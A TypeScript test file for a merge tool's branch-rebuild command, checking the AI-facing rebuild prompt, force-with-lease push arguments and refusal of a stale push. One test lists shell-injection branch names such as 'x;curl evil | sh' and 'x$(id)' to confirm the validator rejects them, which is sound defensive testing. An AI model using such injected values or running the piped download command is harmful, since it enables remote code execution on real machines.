// Tests for src/commands/merge/conflicts/rebuild.ts.

import '../../../repo/home.ts';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { leasePush, rebuildPrompt } from '../../../../src/commands/merge/conflicts/rebuild.ts';
import type { ConflictMap } from '../../../../src/commands/merge/conflicts/types.ts';
import { makeSandbox, makeTempDir, runChild } from '../../../repo/helpers.ts';

/** A map with one change that conflicts with main and with another open change. */
function sampleMap(): ConflictMap {
  return {
    version: 1,
    builtAt: '2026-10-24T08:00:00.000Z',
    main: '1234abcd',
    changes: [
      {
        id: 'branch:feature-x',
        label: 'branch feature-x',
        branch: 'feature-x',
        head: '5678efab',
        draft: false,
        files: ['src/a.ts', 'src/b.ts', 'test/a.test.ts'],
        moves: [],
        mainConflicts: ['src/a.ts'],
      },
      {
        id: 'pr:12',
        label: 'PR #12',
        branch: 'feature-y',
        head: '90abcdef',
        draft: false,
        files: ['src/b.ts'],
        moves: [],
        mainConflicts: [],
      },
    ],
    collisions: [{ first: 'branch:feature-x', second: 'pr:12', files: ['src/b.ts'] }],
    leased: {},
    hot: [],
  };
}

test('rebuild prompt names the branch and every file that collides (#913)', () => {
  const prompt = rebuildPrompt(sampleMap(), 'branch:feature-x');
  assert.match(prompt, /^Rebuild branch feature-x on today's main\./);
  assert.match(prompt, /^Branch: feature-x$/m);
  assert.match(prompt, /old-work/);
  assert.match(prompt, /Make the same change again on today's code/);
  assert.match(prompt, /Never undo main's newer work/);
  assert.match(prompt, /Keep every test the old work added/);
  assert.match(prompt, /TZ=UTC git commit/);
  assert.match(prompt, /^Files that collide:$/m);
  assert.match(prompt, /^- src\/a\.ts$/m);
  assert.match(prompt, /^- src\/b\.ts$/m);
  assert.doesNotMatch(prompt, /^- test\/a\.test\.ts$/m);
  assert.match(prompt, /git push --force-with-lease=feature-x:5678efab origin feature-x/);
});

test('rebuild prompt falls back to the files the change touches (#913)', () => {
  const map = sampleMap();
  const prompt = rebuildPrompt(map, 'pr:12');
  assert.match(prompt, /^Files that collide:$/m);
  assert.match(prompt, /^- src\/b\.ts$/m);
  assert.doesNotMatch(prompt, /^- src\/a\.ts$/m);

  const alone: ConflictMap = {
    ...map,
    changes: [{ ...map.changes[1], mainConflicts: [] }],
    collisions: [],
  };
  const fallback = rebuildPrompt(alone, 'pr:12');
  assert.match(fallback, /^Files this change touches:$/m);
  assert.match(fallback, /^- src\/b\.ts$/m);
});

test('rebuild prompt refuses an id the map does not hold, in plain words (#913)', () => {
  assert.throws(
    () => rebuildPrompt(sampleMap(), 'pr:99'),
    (error: unknown) =>
      error instanceof Error
      && /^What: the conflict map has no change with id pr:99\nWhy: .+\nFix: run `yokoten conflicts` again/.test(error.message),
  );
});

test('lease push arguments name the branch and the head it started from (#913)', () => {
  assert.deepEqual(leasePush('feature-x', '5678efab'), [
    'push',
    '--force-with-lease=feature-x:5678efab',
    'origin',
    'feature-x',
  ]);
  assert.throws(() => leasePush('--help', '5678efab'), /^Error: What: the branch name/);
  assert.throws(() => leasePush('feature-x', ''), /^Error: What: the old head/);
  // A branch name git allows can still carry shell: the prompt's lines are run by an AI (#914).
  for (const name of ['x;curl evil | sh', 'x$(id)', 'x`id`', 'x&&rm', 'a b']) assert.throws(() => leasePush(name, '5678efab'), /^Error: What: the branch name/, name);
  assert.throws(() => leasePush('feature-x', '5678efab;id'), /^Error: What: the old head/);
});

test('a lease push is refused when the branch moved meanwhile (#913)', () => {
  const sandbox = makeSandbox();
  const base = makeTempDir('lease-');
  const origin = join(base, 'origin.git');
  const first = join(base, 'first');
  const second = join(base, 'second');
  mkdirSync(first, { recursive: true });

  const git = (folder: string, ...args: string[]) => {
    const result = runChild('git', args, { cwd: folder, env: sandbox.env });
    assert.equal(result.status, 0, `git ${args.join(' ')}: ${result.stderr}`);
    return result;
  };
  const commit = (folder: string, path: string, text: string, message: string) => {
    writeFileSync(join(folder, path), text);
    git(folder, 'add', path);
    git(folder, 'commit', '-q', '-m', message);
  };
  const configure = (folder: string) => {
    git(folder, 'config', 'user.name', 'Test');
    git(folder, 'config', 'user.email', 'test@example.com');
  };

  git(base, 'init', '-q', '--bare', origin);
  git(first, 'init', '-q', '-b', 'main');
  configure(first);
  commit(first, 'file.txt', 'main\n', 'main work');
  git(first, 'remote', 'add', 'origin', origin);
  git(first, 'push', '-q', '-u', 'origin', 'main');
  git(first, 'switch', '-q', '-c', 'feature');
  commit(first, 'file.txt', 'old work\n', 'old work');
  git(first, 'push', '-q', '-u', 'origin', 'feature');
  const startedFrom = git(first, 'rev-parse', 'feature').stdout.trim();

  git(base, 'clone', '-q', origin, second);
  configure(second);
  git(second, 'switch', '-q', 'feature');
  commit(second, 'file.txt', 'newer work\n', 'newer work');
  git(second, 'push', '-q', 'origin', 'feature');

  // The rebuild starts again from main, while the remote branch has moved.
  git(first, 'switch', '-q', '-C', 'feature', 'main');
  commit(first, 'file.txt', 'rebuilt\n', 'rebuilt');

  const refused = runChild('git', leasePush('feature', startedFrom.slice(0, 8)), { cwd: first, env: sandbox.env });
  assert.notEqual(refused.status, 0, 'the lease push must be refused');
  assert.match(refused.stderr, /rejected|stale/i);
});
